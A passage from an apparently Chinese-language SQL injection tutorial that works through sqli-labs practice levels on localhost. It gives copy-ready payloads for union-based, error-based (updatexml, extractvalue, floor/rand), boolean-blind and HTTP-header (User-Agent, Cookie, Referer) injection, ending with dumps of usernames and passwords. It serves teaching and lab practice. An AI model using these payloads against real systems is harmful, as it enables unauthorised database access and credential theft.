+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">#只需指定表名即可<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#或者指定当前数据库名</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p>获取”users”表中存在3个字段，分别为 “id,username,password”</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5591e604770150f33f8b840c14e1c29c.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><em>7. 爆相应字段的所有数据</em></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">#只需指定表名和字段名<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(`id`,&#x27;</span>:<span class="hljs-string">&#x27;,`username`,&#x27;</span>:<span class="hljs-string">&#x27;,`password`) from users --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#字段值不加反引号也可以</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(id,<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-string">&#x27;:&#x27;</span>,password) <span class="hljs-keyword">from</span> users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/eedfcbea64b0073edf1c4f9296a5d34b.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>至此，联合查询整个过程结束。注入的时候找到注入点后只需套入语句即可。</p>
+<h3 id="2、报错注入"><a href="#2、报错注入" class="headerlink" title="2、报错注入"></a>2、报错注入</h3><p>报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。</p>
+<p>报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</p>
+<p>推荐三种报错注入的方法，直接套用就行。以less-1为例子</p>
+<p><strong>1. group by 重复键冲</strong></p>
+<blockquote>
+<p>and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+</p>
+</blockquote>
+<p>提交如下，获取数据库名字</p>
+<blockquote>
+<p>?id=1’ and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210316093930798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>2. extractvalue() 函数</strong></p>
+<blockquote>
+<p>?id=1’ and extractvalue(1,concat(‘^’,(select database()),’^’)) –+</p>
+</blockquote>
+<p>提交 ?id=1’ and extractvalue(1,concat(‘^’,(select database()),’^’)) –+ 获取数据库名字</p>
+<p><img src="https://img-blog.csdnimg.cn/20210316094306845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>3. updatexml() 函数</strong></p>
+<blockquote>
+<p>and updatexml(1,concat(‘^’,(需要查询的内容),’^’),1)</p>
+</blockquote>
+<ol>
+<li>提交如下，获取数据库名字</li>
+</ol>
+<blockquote>
+<p>?id=1’ and updatexml(1,concat(‘^’,(database()),’^’),1) –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/2021031609453822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ol start="2">
+<li>获取当前数据库中表的名字</li>
+</ol>
+<p>?id=1’ and updatexml(1,concat(‘^’,(select table_name from information_schema.tables where table_schema=’security’ ),’^’),1) –+</p>
+<p><img src="https://img-blog.csdnimg.cn/20210316094730140.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里是说要显示的内容超过一行它不能显示那么多，所以在 table_schema=’security’ 后加上 limit 0,1，显示第一行（显示第0行的往下一行，不包括第0行）</p>
+<p><img src="https://img-blog.csdnimg.cn/20210316095213384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>如果要看第二行则，limit1,1（第一行的往下一行，不包括第一行，即显示第二行），看第三行则limit2,1。以这个方法获取第四个表为users</p>
+<ol start="3">
+<li>爆表中的字段</li>
+</ol>
+<blockquote>
+<p>?id=1’ and updatexml(1,concat(‘^’,(select column_name from information_schema.columns where table_name=’users’ and table_schema=’security’ limit 0,1 ),’^’),1) –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210316095511672.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>总共爆出的字段为： id , username , password</p>
+<ol start="4">
+<li>爆字段中的内容</li>
+</ol>
+<blockquote>
+<p>?id=1’ and updatexml(1,concat(‘^’,(select group_concat(username,”–”,password) from users limit 0,1 ),’^’),1) –+</p>
+</blockquote>
+<p>三组用户名和密码。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210316095719686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="3、基于布尔的盲注"><a href="#3、基于布尔的盲注" class="headerlink" title="3、基于布尔的盲注"></a>3、基于布尔的盲注</h3><p>布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。以less-8关为例</p>
+<ol>
+<li>我们输入正确的id，显示You are in …..</li>
+</ol>
+<p><img src="https://img-blog.csdnimg.cn/2021031617333684.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>我们输入错误的语句如id=1’ ，或者id=-1时，就什么都不显示。这就是布尔盲注，屏幕上能得到信息不多，就是两种状态</p>
+<p><img src="https://img-blog.csdnimg.cn/20210316173450459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>源码如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span><span class="hljs-operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1 &quot;;<br>$<span class="hljs-keyword">result</span><span class="hljs-operator">=</span>mysql_query($<span class="hljs-keyword">sql</span>);<br>$<span class="hljs-type">row</span> <span class="hljs-operator">=</span> mysql_fetch_array($<span class="hljs-keyword">result</span>);<br> <br>	if($<span class="hljs-type">row</span>)<br>	&#123;<br>  	echo <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	<br>  	echo <span class="hljs-string">&#x27;You are in...........&#x27;</span>;<br>  	echo &quot;&lt;br&gt;&quot;;<br>    	echo &quot;&lt;/font&gt;&quot;;<br>  	&#125;<br>	<span class="hljs-keyword">else</span> <br>	&#123;<br>    echo <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;<br>    ｝<br></code></pre></td></tr></table></figure>
+
+<p>所以，我们构造判断语句，根据页面是否回显证实猜想。一般用到的函数ascii() 、substr() 、length()，exists()、concat()等。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210316182126690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ol>
+<li>判断数据库类型</li>
+</ol>
+<ul>
+<li>MySQL数据库表   information_schema.tables</li>
+<li>access           msysobjects </li>
+<li>SQLServer        sysobjects</li>
+</ul>
+<p>用下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是 Mysql数据库<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and exists(select*from information_schema.tables) --+</span><br><span class="hljs-string">//判断是否是 access数据库</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> msysobjects) <span class="hljs-comment">--+</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是 Sqlserver数据库<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and exists(select*from sysobjects) --+</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210316174105779.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210316174130279.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>所以当前数据库为mysql数据库</p>
+<ol start="2">
+<li>判断当前数据库名</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>1：判断当前数据库的长度，利用二分法<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and length(database())&gt;5 --+  //正常显示</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> and length(database())&gt;10 --+  //不显示任何数据<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and length(database())&gt;7 --+  //正常显示</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> and length(database())&gt;8 --+  //不显示任何数据<br> <br>  大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符<br> <br>2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断<br>//判断数据库的第一个字符<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and ascii(substr(database(),1,1))&gt;115 --+ //100为ascii表中的十进制，对应字母s</span><br><span class="hljs-string">//判断数据库的第二个字符</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> and ascii(substr(database(),2,1))&gt;100 --+<br>//判断数据库的第三个字符<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and ascii(substr(database(),3,1))&gt;100 --+</span><br><span class="hljs-string">...........</span><br><span class="hljs-string">由此可以判断出当前数据库为 security</span><br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>判断当前库的表名</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>猜测当前数据库中是否存在admin表<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and exists(select*from admin) --+</span><br><span class="hljs-string">1：判断当前数据库中表的个数</span><br><span class="hljs-string">// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database())<span class="hljs-operator">&gt;</span><span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br> <br><span class="hljs-number">2</span>：判断每个表的长度<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为<span class="hljs-number">6</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+</span><br><span class="hljs-string">//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> length((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">6</span> <span class="hljs-comment">--+</span><br> <br><span class="hljs-number">3</span>：判断每个表的每个字符的ascii值<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断第一个表的第一个字符的ascii值<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span><br><span class="hljs-string">//判断第一个表的第二个字符的ascii值               </span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">100</span> <span class="hljs-comment">--+</span><br>.........<br>由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断<br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>判断表的字段</li>
+</ol>
+<ul>
+<li>判断字段个数</li>
+<li>判断每个字段的长度</li>
+<li>猜每个字段的字符</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>如果已经证实了存在admin表，那么猜测是否存在username字段<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and exists(select username from admin) </span><br><span class="hljs-string">1：判断表中字段的个数</span><br><span class="hljs-string">//判断users表中字段个数是否大于5</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span>)<span class="hljs-operator">&gt;</span><span class="hljs-number">5</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">2</span>：判断每个字段的长度<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断第一个字段的长度<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1))&gt;5 --+</span><br><span class="hljs-string">//判断第二个字段的长度   </span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> length((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">5</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">3</span>：判断每个字段名字的ascii值<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断第一个字段的第一个字符的ascii<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),1,1))&gt;100 --+</span><br><span class="hljs-string">//判断第一个字段的第二个字符的ascii</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">100</span> <span class="hljs-comment">--+</span><br>...........<br>由此可判断出users表中存在 id、username、password 字段<br></code></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>爆字段中的数据</li>
+</ol>
+<ul>
+<li>猜字段中数据的长度</li>
+<li>猜字段数据的每个字符ascii码 得字符</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cobol">我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据<br> <br>1: 判断数据的长度<br>// 判断id字段的第一个数据的长度<br>http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 0,1))&gt;5 --+<br>// 判断id字段的第二个数据的长度<br>http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 1,1))&gt;5 --+<br> <br>2：判断数据的ascii值<br>// 判断id字段的第一行数据的第一个字符的ascii值<br>http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit  0,1),1,1))&gt;100 --+<br>// 判断id字段的第二行数据的第二个字符的ascii值<br>http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))&gt;100 --+<br>...........<br></code></pre></td></tr></table></figure>
+
+<p>一般布尔盲注，手工去注入过于繁琐，不建议手工注入，可以借助于工具。</p>
+<h3 id="4、HTTP头注入"><a href="#4、HTTP头注入" class="headerlink" title="4、HTTP头注入"></a>4、HTTP头注入</h3><p>常见的sql注入一般是通过请求参数或者表单进行注入，而HTTP头部注入是通过HTTP协议头部字段值进行注入。http头注入常存在于以下地方</p>
+<p><img src="https://img-blog.csdnimg.cn/20210323100756615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>产生注入的条件</strong>：</p>
+<p>- 能够对请求头消息进行修改</p>
+<p>- 修改的请求头信息能够带入数据库进行查询</p>
+<p>- 数据库没有对输入的请求信息做过滤</p>
+<p><strong>1. User-Agent注入</strong></p>
+<p>​    User-Agent：使得服务器能够识别客户使用的操作系统，浏览器版本等。（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等然后将其存入数据库中）。这里获取User-Agent就可以知道客户都是通过什么浏览器访问系统的，然后将其值保存到数据库中。</p>
+<p>以sqli-labs less-18关为例，登录用户密码：dumb ,0</p>
+<p>1.1 判断注入点：user-agent值后面加上’，引发报错，确定存在sql注入</p>
+<p><img src="https://img-blog.csdnimg.cn/20210323101045836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>1.2 采用报错注入函数获取当前数据库名</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span>^<span class="hljs-string">&#x27;,(database()),&#x27;</span>^<span class="hljs-string">&#x27;),1) and &#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210323101137486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>2. cookie注入</strong></p>
+<p>​    cookie：服务器端用来记录客户端的状态。由服务端产生，保存在浏览器中。传送门-》<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114359205?ops_request_misc=%7B%22request_id%22:%22161646553116780266210214%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=161646553116780266210214&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-114359205.pc_v1_rank_blog_v1&utm_term=cookie">cookie</a> 。以sqli-labs less-20关为例，登录后</p>
+<p><img src="https://img-blog.csdnimg.cn/20210323101350105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>2.1 首先判断注入点，加 ‘ 单引号报错</p>
+<p><img src="https://img-blog.csdnimg.cn/20210323101417342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>2.2 采用报错注入函数获取当前数据库名</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span>^<span class="hljs-string">&#x27;,(database()),&#x27;</span>^<span class="hljs-string">&#x27;),1) and &#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>3. Referer注入</strong></p>
+<p>​    <strong>Referer：</strong>是HTTP header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p>
+<ol>
+<li><p>判断输入点，加单引号引发报错</p>
+</li>
+<li><p>使用报错注入函数：</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">‘ and updatexml(1,concat(0x7e,(database()),0x7e),0) and &#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210323101809562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>方法都是一样的。</p>
+<p><strong>4. X-Forwarded-For 注入</strong></p>
+<p>X-Forwarded-For(XFF)：用来识别客户端最原始的ip地址。详见，传送门：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/112528864?ops_request_misc=%7B%22request_id%22:%22161646592716780261962393%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=161646592716780261962393&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-112528864.pc_v1_rank_blog_v1&utm_term=X-for">X-Forwarded-For sql注入</a></p>
